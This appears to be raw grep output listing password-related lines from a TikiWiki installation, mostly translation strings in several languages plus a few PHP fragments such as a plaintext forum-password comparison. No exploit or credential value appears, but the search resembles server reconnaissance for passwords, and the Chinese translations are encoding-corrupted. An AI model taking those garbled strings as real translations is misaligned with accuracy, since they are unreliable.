/var/www/tikiwiki/lang/fr/language.php:"Batch upload (CSV file<a {popup text='login,password,email,groups<br />user1,password1,email1,&quot;group1,group2&quot;<br />user2, password2,email2'}><img src=\"img/icons/help.gif\" border=\"0\" height=\"16\" width=\"16\" alt='{tr}help" => "Téléchargement par lot (fichier CSV<a {popup text='login,password,email,groups<br />utilisateur1,mot_de_passe1,email1,&quot;groupe1,groupe2&quot;<br />utilisateur2, mot_de_passe2,email2'}><img src=\"img/icons/help.gif\" border=\"0\" height=\"16\" width=\"16\" alt='{tr}aide",
/var/www/tikiwiki/lang/fr/language.php:"Change admin password" => "Modifier le mot de passe de l'administrateur",
/var/www/tikiwiki/lang/fr/language.php:"Change password" => "Changer votre mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Invalid password.  Your current password is required to change administrative information" => "Mot de passe invalide.  Votre mot de passe courant est nécessaire pour modifier les informations de votre compte",
/var/www/tikiwiki/lang/fr/language.php:"The passwords did not match" => "Le mot de passe ne correspond pas",
/var/www/tikiwiki/lang/fr/language.php:"A password and your IP address reminder email has been sent " => "Un rappel de votre mot de passe et de votre adresse IP a été envoyé",
/var/www/tikiwiki/lang/fr/language.php:"A new (and temporary) password and your IP address has been sent " => "Un nouveau mot de passe (temporaire) et votre adresse IP vous ont été envoyés ",
/var/www/tikiwiki/lang/fr/language.php:"You cannot have a blank password" => "Vous ne pouvez pas avoir un mot de passe vide",
/var/www/tikiwiki/lang/fr/language.php:"Your admin password has been changed" => "Votre mot de passe administrateur a été changé",
/var/www/tikiwiki/lang/sk/language.php:"A new password has been sent " => "Nové heslo bolo odoslané ",
/var/www/tikiwiki/lang/sk/language.php:"A password reminder email has been sent " => "Pripomenutie hesla bolo poslané na e-mail ",
/var/www/tikiwiki/lang/sk/language.php:"Change your password" => "Zmeniť heslo",
/var/www/tikiwiki/lang/sk/language.php:// "Click here if you've forgotten your password" => "Click here if you've forgotten your password",
/var/www/tikiwiki/lang/sk/language.php:// "Reg users can change password" => "Reg users can change password",
/var/www/tikiwiki/lang/sk/language.php:// "Passing Percentage" => "Passing Percentage",
/var/www/tikiwiki/lang/sk/language.php:// "Leave \"New password\" and \"Confirm new password\" fields blank to keep current password" => "Leave \"New password\" and \"Confirm new password\" fields blank to keep current password",
/var/www/tikiwiki/lang/sk/language.php:// "Confirm new password" => "Confirm new password",
/var/www/tikiwiki/lang/sk/language.php:// "Current password (required)" => "Current password (required)",
/var/www/tikiwiki/lang/sk/language.php:// "The passwords don't match" => "The passwords don't match",
/var/www/tikiwiki/lang/sk/language.php:// "Your admin password has been changed" => "Your admin password has been changed",
/var/www/tikiwiki/lang/sk/language.php:// "The passwords didn't match" => "The passwords didn't match",
/var/www/tikiwiki/lang/sk/language.php:// "A password and your IP address reminder email has been sent " => "A password and your IP address reminder email has been sent ",
/var/www/tikiwiki/lang/sk/language.php:// "A new password and your IP address has been sent " => "A new password and your IP address has been sent ",
/var/www/tikiwiki/lang/sk/language.php:// "Invalid password.  Your current password is required to change administrative information" => "Invalid password.  Your current password is required to change administrative information",
/var/www/tikiwiki/lang/sk/language.php:"Missing information to read news (server,port,username,password,group) required" => "Missing information to read news (server,port,username,password,group) required",
/var/www/tikiwiki/lang/sk/language.php:"requested a reminder of the password for the" => "požiadal o pripomenutie hesla pre",
/var/www/tikiwiki/lang/sk/language.php:"password for this account is" => "heslo pre tento account je",
/var/www/tikiwiki/lang/sk/language.php:"pass" => "heslo",
/var/www/tikiwiki/lang/sk/language.php:"I forgot my pass" => "Zabudnuté heslo",
/var/www/tikiwiki/lang/sk/language.php:"Passcode to register (not your user password)" => "Tajný kód pre registráciu (nie vaše heslo)",
/var/www/tikiwiki/lang/sk/language.php:"Password" => "Heslo",
/var/www/tikiwiki/lang/sk/language.php:"Repeat password" => "Zopakovať heslo",
/var/www/tikiwiki/lang/sk/language.php:"Generate a password" => "Vygenerovať heslo",
/var/www/tikiwiki/lang/sk/language.php:"Change admin password" => "Zmeniť heslo administrátora",
/var/www/tikiwiki/lang/sk/language.php:"New password" => "Nové heslo",
/var/www/tikiwiki/lang/sk/language.php:"Change password" => "Zmena hesla",
/var/www/tikiwiki/lang/sk/language.php:"Request passcode to register" => "Požiadajte o tajný kód pre registráciu",
/var/www/tikiwiki/lang/sk/language.php:"Remind passwords by email" => "Pripomínať heslá emailom",
/var/www/tikiwiki/lang/sk/language.php:"Store plaintext passwords" => "Ukladať nekryptované heslá",
/var/www/tikiwiki/lang/sk/language.php:"Force to use chars and nums in passwords" => "Vynútené používanie znakov a čísiel v heslách",
/var/www/tikiwiki/lang/sk/language.php:"Minimum password length" => "Minimálna dĺžka hesla",
/var/www/tikiwiki/lang/sk/language.php:"Password invalid after days" => "Heslo expiruje po dňoch",
/var/www/tikiwiki/lang/sk/language.php:"Password protected" => "Ochránené heslom",
/var/www/tikiwiki/lang/sk/language.php:"Forum password" => "Fórum: heslo",
/var/www/tikiwiki/lang/sk/language.php:"Pass" => "Heslo",
/var/www/tikiwiki/lang/sk/language.php:"Change password enforced" => "Vynútená zmena hesla",
/var/www/tikiwiki/lang/sk/language.php:"Old password" => "Pôvodné heslo",
/var/www/tikiwiki/lang/sk/language.php:"I forgot my password" => "Zabudol som heslo",
/var/www/tikiwiki/lang/sk/language.php:"send me my password" => "pošli mi moje heslo",
/var/www/tikiwiki/lang/sk/language.php:"password" => "heslo",
/var/www/tikiwiki/lang/sk/language.php:"Password should be at least" => "Heslo musí mať aspoň",
/var/www/tikiwiki/lang/sk/language.php:"Password is required" => "Heslo je povinná položka",
/var/www/tikiwiki/lang/sk/language.php:"The passwords dont match" => "Heslá sa nezhodujú",
/var/www/tikiwiki/lang/sk/language.php:"Password must contain both letters and numbers" => "Heslo musí obsahovať čísla aj písmená",
/var/www/tikiwiki/lang/sk/language.php:"You can not use the same password again" => "Nemôžete znova použiť to isté heslo",
/var/www/tikiwiki/lang/sk/language.php:"Invalid old password" => "Nesprávne pôvodné heslo",
/var/www/tikiwiki/lang/sk/language.php:"Invalid username or password" => "Nesprávne užívateľské meno alebo heslo",
/var/www/tikiwiki/lang/sk/language.php:"Wrong passcode you need to know the passcode to register in this site" => "Nesprávny tajný kód. Aby ste sa mohli prihlásiť, musíte poznať tajný kód",
/var/www/tikiwiki/lang/sk/language.php:"The passwords did not match" => "Heslá sa nezhodovali",
/var/www/tikiwiki/lang/sk/language.php:"Wrong password. Cannot post comment" => "Nesprávne heslo. Nemôžem zapísať komentár",
/var/www/tikiwiki/lang/he/language.php:"You cant use the same password again" => "לא ניתן להשתמש באותה סיסמה שוב",
/var/www/tikiwiki/lang/he/language.php:" requested to send the password for " => " התקבלה בקשה לשלוח את הסיסמה של משתמש ",
/var/www/tikiwiki/lang/he/language.php:" and the requested password is " => "הסיסמה המבוקשת היא (your password is): ",
/var/www/tikiwiki/lang/he/language.php:"You will receive an email with your password soon" => "הסיסמה נשלחה לכתובת הדואר האלקטרוני הרשומה אצלנו.",
/var/www/tikiwiki/lang/he/language.php:"Change your password" => "שינוי סיסמה",
/var/www/tikiwiki/lang/he/language.php:// "Click here if you've forgotten your password" => "Click here if you've forgotten your password",
/var/www/tikiwiki/lang/he/language.php:// "Repeat password" => "Repeat password",
/var/www/tikiwiki/lang/he/language.php:// "Change password" => "Change password",
/var/www/tikiwiki/lang/he/language.php:// "Reg users can change password" => "Reg users can change password",
/var/www/tikiwiki/lang/he/language.php:// "Password protected" => "Password protected",
/var/www/tikiwiki/lang/he/language.php:// "Forum password" => "Forum password",
/var/www/tikiwiki/lang/he/language.php:// "Passing Percentage" => "Passing Percentage",
/var/www/tikiwiki/lang/he/language.php:// "Leave \"New password\" and \"Confirm new password\" fields blank to keep current password" => "Leave \"New password\" and \"Confirm new password\" fields blank to keep current password",
/var/www/tikiwiki/lang/he/language.php:// "Confirm new password" => "Confirm new password",
/var/www/tikiwiki/lang/he/language.php:// "Current password (required)" => "Current password (required)",
/var/www/tikiwiki/lang/he/language.php:// "The passwords don't match" => "The passwords don't match",
/var/www/tikiwiki/lang/he/language.php:// "Your admin password has been changed" => "Your admin password has been changed",
/var/www/tikiwiki/lang/he/language.php:// "Password is required" => "Password is required",
/var/www/tikiwiki/lang/he/language.php:// "You can not use the same password again" => "You can not use the same password again",
/var/www/tikiwiki/lang/he/language.php:// "Missing information to read news (server,port,username,password,group) required" => "Missing information to read news (server,port,username,password,group) required",
/var/www/tikiwiki/lang/he/language.php:// "A password and your IP address reminder email has been sent " => "A password and your IP address reminder email has been sent ",
/var/www/tikiwiki/lang/he/language.php:// "A new password and your IP address has been sent " => "A new password and your IP address has been sent ",
/var/www/tikiwiki/lang/he/language.php:// "Invalid password.  Your current password is required to change administrative information" => "Invalid password.  Your current password is required to change administrative information",
/var/www/tikiwiki/lang/he/language.php:// "Wrong password. Cannot post comment" => "Wrong password. Cannot post comment",
/var/www/tikiwiki/lang/he/language.php:"requested a reminder of the password for the" => "התקבלה בקשה לשחזור סיסמה עבור משתמש",
/var/www/tikiwiki/lang/he/language.php:"password for this account is" => "שהסיסמה למשתמש זה היא:",
/var/www/tikiwiki/lang/he/language.php:"pass" => "סיסמה",
/var/www/tikiwiki/lang/he/language.php:"I forgot my pass" => "שכחתי את הסיסמה שלי",
/var/www/tikiwiki/lang/he/language.php:"Passcode to register (not your user password)" => "קוד רישום (לא הסיסמה שלך)",
/var/www/tikiwiki/lang/he/language.php:"Password" => "סיסמה",
/var/www/tikiwiki/lang/he/language.php:"Generate a password" => "בחר לי סיסמה",
/var/www/tikiwiki/lang/he/language.php:"Change admin password" => "שינוי סיסמת מנהל",
/var/www/tikiwiki/lang/he/language.php:"New password" => "סיסמה חדשה",
/var/www/tikiwiki/lang/he/language.php:"Request passcode to register" => "התנית רישום במילת מעבר",
/var/www/tikiwiki/lang/he/language.php:"Remind passwords by email" => "שחזור סיסמה על ידי דואר אלקטרוני",
/var/www/tikiwiki/lang/he/language.php:"Store plaintext passwords" => "שמירת סיסמאות בגלוי (לא מומלץ)",
/var/www/tikiwiki/lang/he/language.php:"Force to use chars and nums in passwords" => "חיוב משתמש לכלול בסיסמה תווים וספרות",
/var/www/tikiwiki/lang/he/language.php:"Minimum password length" => "אורך מינימלי לסיסמה",
/var/www/tikiwiki/lang/he/language.php:"Password invalid after days" => "מספר הימים המרבי עד לפקיעת הסיסמה",
/var/www/tikiwiki/lang/he/language.php:"Pass" => "סיסמה",
/var/www/tikiwiki/lang/he/language.php:"Change password enforced" => "שינוי סיסמה",
/var/www/tikiwiki/lang/he/language.php:"Old password" => "סיסמה ישנה",
/var/www/tikiwiki/lang/he/language.php:"I forgot my password" => "שכחתי את הסיסמה שלי",
/var/www/tikiwiki/lang/he/language.php:"send me my password" => "שליחת הסיסמה",
/var/www/tikiwiki/lang/he/language.php:"password" => "סיסמה",
/var/www/tikiwiki/lang/he/language.php:"Password should be at least" => "הסיסמה צריכה להיות באורך של לפחות",
/var/www/tikiwiki/lang/he/language.php:"The passwords dont match" => "הסיסמאות אינן תואמות.",
/var/www/tikiwiki/lang/he/language.php:"Password must contain both letters and numbers" => "הסיסמה צריכה להכיל גם תווים וגם ספרות",
/var/www/tikiwiki/lang/he/language.php:"The passwords didn't match" => "הסיסאות החדשות אינן תואמות.",
/var/www/tikiwiki/lang/he/language.php:"Invalid old password" => "סיסמה ישנה לא תקינה.",
/var/www/tikiwiki/lang/he/language.php:"Invalid username or password" => "שם משתמש או סיסמה לא חוקיים.",
/var/www/tikiwiki/lang/he/language.php:"Wrong passcode you need to know the passcode to register in this site" => "קוד הרישום שגוי ולפיכך ההרשמה לאתר לא התבצעה.",
/var/www/tikiwiki/lang/he/language.php:"The passwords did not match" => "הסיסאות החדשות אינן תואמות.",
/var/www/tikiwiki/lang/tv/language.php:"Invalid password.  You current password is required to change your email\naddress." => "Se te password.  Tau password nei e manakogina ke fuli tau e-mail address.",
/var/www/tikiwiki/lang/tv/language.php:"change password" => "fuli te password",
/var/www/tikiwiki/lang/tv/language.php:// "requested a reminder of the password for the" => "requested a reminder of the password for the",
/var/www/tikiwiki/lang/tv/language.php:// "password for this account is" => "password for this account is",
/var/www/tikiwiki/lang/tv/language.php:// "pass" => "pass",
/var/www/tikiwiki/lang/tv/language.php:// "Click here if you've forgotten your password" => "Click here if you've forgotten your password",
/var/www/tikiwiki/lang/tv/language.php:// "I forgot my pass" => "I forgot my pass",
/var/www/tikiwiki/lang/tv/language.php:// "Passcode to register (not your user password)" => "Passcode to register (not your user password)",
/var/www/tikiwiki/lang/tv/language.php:// "Password" => "Password",
/var/www/tikiwiki/lang/tv/language.php:// "Repeat password" => "Repeat password",
/var/www/tikiwiki/lang/tv/language.php:// "Generate a password" => "Generate a password",
/var/www/tikiwiki/lang/tv/language.php:// "Change admin password" => "Change admin password",
/var/www/tikiwiki/lang/tv/language.php:// "New password" => "New password",
/var/www/tikiwiki/lang/tv/language.php:// "Change password" => "Change password",
/var/www/tikiwiki/lang/tv/language.php:// "Request passcode to register" => "Request passcode to register",
/var/www/tikiwiki/lang/tv/language.php:// "Remind passwords by email" => "Remind passwords by email",
/var/www/tikiwiki/lang/tv/language.php:// "Reg users can change password" => "Reg users can change password",
/var/www/tikiwiki/lang/tv/language.php:// "Store plaintext passwords" => "Store plaintext passwords",
/var/www/tikiwiki/lang/tv/language.php:// "Force to use chars and nums in passwords" => "Force to use chars and nums in passwords",
/var/www/tikiwiki/lang/tv/language.php:// "Minimum password length" => "Minimum password length",
/var/www/tikiwiki/lang/tv/language.php:// "Password invalid after days" => "Password invalid after days",
/var/www/tikiwiki/lang/tv/language.php:// "Password protected" => "Password protected",
/var/www/tikiwiki/lang/tv/language.php:// "Forum password" => "Forum password",
/var/www/tikiwiki/lang/tv/language.php:// "Pass" => "Pass",
/var/www/tikiwiki/lang/tv/language.php:// "Change password enforced" => "Change password enforced",
/var/www/tikiwiki/lang/tv/language.php:// "Old password" => "Old password",
/var/www/tikiwiki/lang/tv/language.php:// "Passing Percentage" => "Passing Percentage",
/var/www/tikiwiki/lang/tv/language.php:// "I forgot my password" => "I forgot my password",
/var/www/tikiwiki/lang/tv/language.php:// "send me my password" => "send me my password",
/var/www/tikiwiki/lang/tv/language.php:// "password" => "password",
/var/www/tikiwiki/lang/tv/language.php:// "Leave \"New password\" and \"Confirm new password\" fields blank to keep current password" => "Leave \"New password\" and \"Confirm new password\" fields blank to keep current password",
/var/www/tikiwiki/lang/tv/language.php:// "Confirm new password" => "Confirm new password",
/var/www/tikiwiki/lang/tv/language.php:// "Current password (required)" => "Current password (required)",
/var/www/tikiwiki/lang/tv/language.php:// "Invalid username or password" => "Invalid username or password",
/var/www/tikiwiki/lang/tv/language.php:// "Missing information to read news (server,port,username,password,group) required" => "Missing information to read news (server,port,username,password,group) required",
/var/www/tikiwiki/lang/tv/language.php:// "Wrong passcode you need to know the passcode to register in this site" => "Wrong passcode you need to know the passcode to register in this site",
/var/www/tikiwiki/lang/tv/language.php:// "A password and your IP address reminder email has been sent " => "A password and your IP address reminder email has been sent ",
/var/www/tikiwiki/lang/tv/language.php:// "A new password and your IP address has been sent " => "A new password and your IP address has been sent ",
/var/www/tikiwiki/lang/tv/language.php:// "Invalid password.  Your current password is required to change administrative information" => "Invalid password.  Your current password is required to change administrative information",
/var/www/tikiwiki/lang/tv/language.php:// "The passwords did not match" => "The passwords did not match",
/var/www/tikiwiki/lang/tv/language.php:// "Wrong password. Cannot post comment" => "Wrong password. Cannot post comment",
/var/www/tikiwiki/lang/tv/language.php:"The passwords don't match" => "Se pau te password",
/var/www/tikiwiki/lang/tv/language.php:"Password should be at least" => "Password e tau te aofaki mai iluga atu ite",
/var/www/tikiwiki/lang/tv/language.php:"Your admin password has been changed" => "Tau password faka Admin ko oti ne fakamafuli",
/var/www/tikiwiki/lang/tv/language.php:"Password is required" => "Manakogina te password",
/var/www/tikiwiki/lang/tv/language.php:"The passwords dont match" => "A password se pau",
/var/www/tikiwiki/lang/tv/language.php:"Password must contain both letters and numbers" => "Password e tau o aofia a mataimanu \nmo napa",
/var/www/tikiwiki/lang/tv/language.php:"The passwords didn't match" => "A passwords e se pau",
/var/www/tikiwiki/lang/tv/language.php:"You can not use the same password again" => "E se mafai o toe fakaoga te password mua",
/var/www/tikiwiki/lang/tv/language.php:"Invalid old password" => "E se tau password mua",
/var/www/tikiwiki/lang/nl/language.php:"requested a reset of the password for the" => "heeft een reset van het wachtwoord gevraagd voor de",
/var/www/tikiwiki/lang/nl/language.php:"Since this is your registered email address we inform that the password for this account is" => "Sinds dit uw geregistreerd e-mail adres is, informeren we u dat het wachtwoord voor dit account het volgende is",
/var/www/tikiwiki/lang/nl/language.php:"The old password remains active until you activate the new one by following this link:" => "Het oude wachtwoord blijft actief totdat u het nieuwe wachtwoord activeert door deze koppeling te volgen:",
/var/www/tikiwiki/lang/nl/language.php:"This is only a temporary password. After you logged in with it, you will get to the 'change password' dialog." => "Dit is slechts een tijdelijk wachtwoord. Nadat u zich heeft aangemeld, zal u een 'Verander wachtwoord' venster te zien krijgen.",
/var/www/tikiwiki/lang/nl/language.php:"Reg users can change password" => "Geregistreerde gebruikers kunnen hun wachtwoord veranderen",
/var/www/tikiwiki/lang/nl/language.php:"Tiki preferences value field in db is set to be max. 250 characters long by default until now. That applies for the custom code content too. Check this field if you want to update your preferences database table to support more than 250 chars (although it was tested and works fine with mysql, it's recommended to backup your data manually before any database update)" => "Tiki instellingen waardeveld in de databank is momenteel max. 250 karakters lang. Dat geldt eveneens voor alle aangepaste inhoud. Controleer deze databank tabel indien u deze databank tabel wenst aan te passen zodat deze meer dan 250 karakters per veld ondersteunt (ook al werden aanpassingen voorheen uitgevoerd en getest met mysql zonder problemen, dient u toch eerst een reservekopie van uw databank te maken)",
/var/www/tikiwiki/lang/nl/language.php:"Batch upload (CSV file<a {popup text='login,password,email'}><img src=\"img/icons/help.gif\" border=\"0\" height=\"16\" width=\"16\" alt='{tr}help" => "Bulk aanlevering (CSV bestand<a {popup text='login,password,email'}><img src=\"img/icons/help.gif\" border=\"0\" height=\"16\" width=\"16\" alt='{tr}hulp",
/var/www/tikiwiki/lang/nl/language.php:"Passing Percentage" => "Slaagpercentage",
/var/www/tikiwiki/lang/nl/language.php:"Altering database table failed" => "Aanpassing databank tabel gefaald",
/var/www/tikiwiki/lang/nl/language.php:"Pass" => "Pass",
/var/www/tikiwiki/lang/nl/language.php:"WikiDiff::apply: line count mismatch: %s != %s" => "WikiVerschil::toepassen: verschil in lijnnummers: %s != %s",
/var/www/tikiwiki/lang/nl/language.php:"requested a reminder of the password for the" => "heeft een herinnering aangevraagd voor het password voor de",
/var/www/tikiwiki/lang/nl/language.php:"pass" => "wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Click here if you've forgotten your password" => "Klik hier indien u uw wachtwoord bent vergeten",
/var/www/tikiwiki/lang/nl/language.php:"I forgot my pass" => "Ik ben mijn wachtwoord vergeten",
/var/www/tikiwiki/lang/nl/language.php:"Passcode to register (not your user password)" => "Pascode om te registreren (niet uw gebruikerwachtwoord)",
/var/www/tikiwiki/lang/nl/language.php:"Password" => "Wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Repeat password" => "Opnieuw",
/var/www/tikiwiki/lang/nl/language.php:"Generate a password" => "Maak een wachtwoord aan",
/var/www/tikiwiki/lang/nl/language.php:"Apply template" => "Sjabloon toepassen",
/var/www/tikiwiki/lang/nl/language.php:"Change admin password" => "Wachtwoord beheerder wijzigen",
/var/www/tikiwiki/lang/nl/language.php:"New password" => "Nieuw wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Change password" => "Verander wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Request passcode to register" => "Pascode voor registratie vragen",
/var/www/tikiwiki/lang/nl/language.php:"Remind passwords by email" => "Wachtwoorden in herinnering brengen via e-mail",
/var/www/tikiwiki/lang/nl/language.php:"Store plaintext passwords" => "Plaintext wachtwoorden opslaan",
/var/www/tikiwiki/lang/nl/language.php:"Force to use chars and nums in passwords" => "Afdwingen om karakters en cijfers te gebruiken in wachtwoorden",
/var/www/tikiwiki/lang/nl/language.php:"Minimum password length" => "Minimale wachtwoordlengte",
/var/www/tikiwiki/lang/nl/language.php:"Password invalid after days" => "Wachtwoord ongeldig na aantal dagen",
/var/www/tikiwiki/lang/nl/language.php:"Password protected" => "Beveiligd door wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Forum password" => "Forum wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Options (if apply)" => "Opties (indien van toepassing)",
/var/www/tikiwiki/lang/nl/language.php:"Change password enforced" => "Wachtwoordwijziging verplicht",
/var/www/tikiwiki/lang/nl/language.php:"Old password" => "Oud wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"I forgot my password" => "Ik ben mijn wachtwoord vergeten",
/var/www/tikiwiki/lang/nl/language.php:"send me my password" => "gelieve mijn wachtwoord op te sturen",
/var/www/tikiwiki/lang/nl/language.php:"password" => "wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Leave \"New password\" and \"Confirm new password\" fields blank to keep current password" => "Laat \"Nieuw wachtwoord\" en \"Bevestig nieuw wachtwoord\" velden open om uw huidig wachtwoord te behouden",
/var/www/tikiwiki/lang/nl/language.php:"Confirm new password" => "Bevestig nieuw wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Current password (required)" => "Huidig wachtwoord (vereist)",
/var/www/tikiwiki/lang/nl/language.php:"The passwords don't match" => "De wachtwoorden komen niet overeen",
/var/www/tikiwiki/lang/nl/language.php:"Password should be at least" => "Wachtwoord moet ten minste",
/var/www/tikiwiki/lang/nl/language.php:"Your admin password has been changed" => "Uw beheerder wachtwoord is gewijzigd",
/var/www/tikiwiki/lang/nl/language.php:"Password is required" => "Wachtwoord is verplicht",
/var/www/tikiwiki/lang/nl/language.php:"The passwords dont match" => "De wachtwoorden komen niet overeen",
/var/www/tikiwiki/lang/nl/language.php:"Password must contain both letters and numbers" => "Wachtwoord moet zowel letters als cijfers bevatten",
/var/www/tikiwiki/lang/nl/language.php:"The passwords didn't match" => "De wachtwoorden komen niet overeen",
/var/www/tikiwiki/lang/nl/language.php:"You can not use the same password again" => "U kan hetzelfde wachtwoord niet opnieuw gebruiken",
/var/www/tikiwiki/lang/nl/language.php:"Invalid old password" => "Ongeldig oud wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Invalid username or password" => "Ongeldige gebruikernaam of wachtwoord",
/var/www/tikiwiki/lang/nl/language.php:"Missing information to read news (server,port,username,password,group) required" => "Informatie ontbreekt om nieuws te kunnen lezen (server, poort, gebruikernaam, wachtwoord, groep)",
/var/www/tikiwiki/lang/nl/language.php:"Wrong passcode you need to know the passcode to register in this site" => "Verkeerde pascode, u heeft de pascode nodig om voor deze site te registreren",
/var/www/tikiwiki/lang/nl/language.php:"A password and your IP address reminder email has been sent " => "Een wachtwoord en IP adres herinnering werden verstuurd",
/var/www/tikiwiki/lang/nl/language.php:"A new password and your IP address has been sent " => "Een nieuw wachtwoord en IP adres werden verzonden ",
/var/www/tikiwiki/lang/nl/language.php:"Invalid password.  Your current password is required to change administrative information" => "Ongeldige wachtwoord.  Uw huidig wachtwoord is vereist om administratieve informatie bij te werken",
/var/www/tikiwiki/lang/nl/language.php:"The passwords did not match" => "De wachtwoorden komen niet overeen",
/var/www/tikiwiki/lang/nl/language.php:"Wrong password. Cannot post comment" => "Verkeerd wachtwoord. Kan commentaar niet toevoegen",
/var/www/tikiwiki/lang/cn/language.php:"Change your password" => "修改您的 密�",
/var/www/tikiwiki/lang/cn/language.php:">I forgot my password" => ">忘记密�",
/var/www/tikiwiki/lang/cn/language.php:"You cant use the same password again" => "您�能�次使用相�密�",
/var/www/tikiwiki/lang/cn/language.php:"You will receive an email with your password soon" => "You will receive an email with your password soon",
/var/www/tikiwiki/lang/cn/language.php:"A password reminder email has been sent " => "A password reminder email has been sent ",
/var/www/tikiwiki/lang/cn/language.php:"A new password has been sent " => "A new password has been sent ",
/var/www/tikiwiki/lang/cn/language.php:// "Click here if you've forgotten your password" => "Click here if you've forgotten your password",
/var/www/tikiwiki/lang/cn/language.php:// "Change password" => "Change password",
/var/www/tikiwiki/lang/cn/language.php:// "Reg users can change password" => "Reg users can change password",
/var/www/tikiwiki/lang/cn/language.php:// "Passing Percentage" => "Passing Percentage",
/var/www/tikiwiki/lang/cn/language.php:// "Leave \"New password\" and \"Confirm new password\" fields blank to keep current password" => "Leave \"New password\" and \"Confirm new password\" fields blank to keep current password",
/var/www/tikiwiki/lang/cn/language.php:// "Confirm new password" => "Confirm new password",
/var/www/tikiwiki/lang/cn/language.php:// "Current password (required)" => "Current password (required)",
/var/www/tikiwiki/lang/cn/language.php:// "The passwords don't match" => "The passwords don't match",
/var/www/tikiwiki/lang/cn/language.php:// "Your admin password has been changed" => "Your admin password has been changed",
/var/www/tikiwiki/lang/cn/language.php:// "The passwords didn't match" => "The passwords didn't match",
/var/www/tikiwiki/lang/cn/language.php:// "A password and your IP address reminder email has been sent " => "A password and your IP address reminder email has been sent ",
/var/www/tikiwiki/lang/cn/language.php:// "A new password and your IP address has been sent " => "A new password and your IP address has been sent ",
/var/www/tikiwiki/lang/cn/language.php:// "Invalid password.  Your current password is required to change administrative information" => "Invalid password.  Your current password is required to change administrative information",
/var/www/tikiwiki/lang/cn/language.php:"requested a reminder of the password for the" => "requested a reminder of the password for the",
/var/www/tikiwiki/lang/cn/language.php:"password for this account is" => "password for this account is",
/var/www/tikiwiki/lang/cn/language.php:"Repeat password" => "Repeat password",
/var/www/tikiwiki/lang/cn/language.php:"Password protected" => "Password protected",
/var/www/tikiwiki/lang/cn/language.php:"Forum password" => "Forum password",
/var/www/tikiwiki/lang/cn/language.php:"Password is required" => "Password is required",
/var/www/tikiwiki/lang/cn/language.php:"Wrong password. Cannot post comment" => "Wrong password. Cannot post comment",
/var/www/tikiwiki/lang/cn/language.php:"pass" => "密�",
/var/www/tikiwiki/lang/cn/language.php:"I forgot my pass" => "忘记密�",
/var/www/tikiwiki/lang/cn/language.php:"Passcode to register (not your user password)" => "注册用通行��(�是您的用户密�)",
/var/www/tikiwiki/lang/cn/language.php:"Password" => "密�",
/var/www/tikiwiki/lang/cn/language.php:"Generate a password" => "生�一个密�",
/var/www/tikiwiki/lang/cn/language.php:"Change admin password" => "改�系统管�员密�",
/var/www/tikiwiki/lang/cn/language.php:"New password" => "新密�",
/var/www/tikiwiki/lang/cn/language.php:"Request passcode to register" => "需�通行���能注册",
/var/www/tikiwiki/lang/cn/language.php:"Remind passwords by email" => "用email�?示密�",
/var/www/tikiwiki/lang/cn/language.php:"Store plaintext passwords" => "以明��存密�",
/var/www/tikiwiki/lang/cn/language.php:"Force to use chars and nums in passwords" => "�制密��能使用字符和数字",
/var/www/tikiwiki/lang/cn/language.php:"Minimum password length" => "密�最短字符数",
/var/www/tikiwiki/lang/cn/language.php:"Password invalid after days" => "密�失效天数",
/var/www/tikiwiki/lang/cn/language.php:"Pass" => "密�",
/var/www/tikiwiki/lang/cn/language.php:"Change password enforced" => "强制修改 密�",
/var/www/tikiwiki/lang/cn/language.php:"Old password" => "旧密�",
/var/www/tikiwiki/lang/cn/language.php:"I forgot my password" => "忘记密�",
/var/www/tikiwiki/lang/cn/language.php:"send me my password" => "寄回我的 密�",
/var/www/tikiwiki/lang/cn/language.php:"password" => "密�",
/var/www/tikiwiki/lang/cn/language.php:"Password should be at least" => "至少得有密�",
/var/www/tikiwiki/lang/cn/language.php:"The passwords dont match" => "两个密��匹�",
/var/www/tikiwiki/lang/cn/language.php:"Password must contain both letters and numbers" => "密�必须�时包�字符和数字",
/var/www/tikiwiki/lang/cn/language.php:"You can not use the same password again" => "您�能�次使用旧密�",
/var/www/tikiwiki/lang/cn/language.php:"Invalid old password" => "旧密��正确",
/var/www/tikiwiki/lang/cn/language.php:"Invalid username or password" => "�正确的用户�?称或密�",
/var/www/tikiwiki/lang/cn/language.php:"Missing information to read news (server,port,username,password,group) required" => "缺少新闻组�务器的设定信�(�务器�?,端�,用户�?,密�,新闻组)",
/var/www/tikiwiki/lang/cn/language.php:"Wrong passcode you need to know the passcode to register in this site" => "错误的通行��您必须知�通行���能在这个网站注册",
/var/www/tikiwiki/lang/cn/language.php:"The passwords did not match" => "两个密��匹�",
/var/www/tikiwiki/tiki-modules.php:     $pass = 'y';
/var/www/tikiwiki/tiki-modules.php:             $pass="n";
/var/www/tikiwiki/tiki-modules.php:             $pass = 'n';
/var/www/tikiwiki/tiki-modules.php:             $pass = 'n';
/var/www/tikiwiki/tiki-modules.php:                                     $pass = 'y';
/var/www/tikiwiki/tiki-modules.php:                                     $pass = 'y';
/var/www/tikiwiki/tiki-modules.php:                                             $pass = 'y';
/var/www/tikiwiki/tiki-modules.php:     if ($pass == 'y') {
/var/www/tikiwiki/tiki-view_forum.php:// the following code is needed to pass $_REQUEST variables that are not passed as URL parameters
/var/www/tikiwiki/tiki-view_forum.php:                  // this SESSION var passes the current REQUEST variables since they are not passed by URL
/var/www/tikiwiki/tiki-view_forum.php:          if ($forum_info['forum_use_password'] != 'n' && $_REQUEST['password'] != $forum_info['forum_password']) {
/var/www/tikiwiki/tiki-view_forum.php:              $smarty->assign('msg', tra("Wrong password. Cannot post comment"));
/var/www/tikiwiki/tiki-admin_include_login.php:    if (isset($_REQUEST["change_password"]) && $_REQUEST["change_password"] == "on") {
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("change_password", 'y');
/var/www/tikiwiki/tiki-admin_include_login.php: $tikilib->set_preference("change_password", 'n');
/var/www/tikiwiki/tiki-admin_include_login.php:    if (isset($_REQUEST["useRegisterPasscode"]) && $_REQUEST["useRegisterPasscode"] == "on") {
